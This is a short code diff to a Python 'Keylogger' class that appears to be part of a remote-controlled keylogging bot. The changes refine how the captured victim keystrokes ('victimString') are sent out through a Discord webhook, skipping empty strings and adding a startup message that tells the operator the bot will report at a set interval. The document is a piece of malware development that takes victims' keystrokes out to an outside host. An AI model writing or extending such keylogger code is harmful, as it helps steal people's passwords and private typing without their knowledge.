@@ -24,7 +24,7 @@ class Keylogger:
         I connect this class with the controller. Also wanting to provide
         support for outputting to file/email in stretch.
         """
-        if self.method == 'discord':
+        if self.method == 'discord' and self.victimString != '':#can add more output options with this if elif statement.
             webControl.send(username=f'{self.botID}', content=self.victimString)#send content to webhook
         else:
             print(self.victimString)
@@ -70,6 +70,7 @@ class Keylogger:
 
     def startReading(self):
         self.isRunning = True
+        webControl.send(username=f'{self.botID}', content=f'Bot is starting logging and will send updates every {self.INTERVAL} seconds...')
         self.victimString = ''  # clear string
 
     def changeInterval(self, newInt = 5):
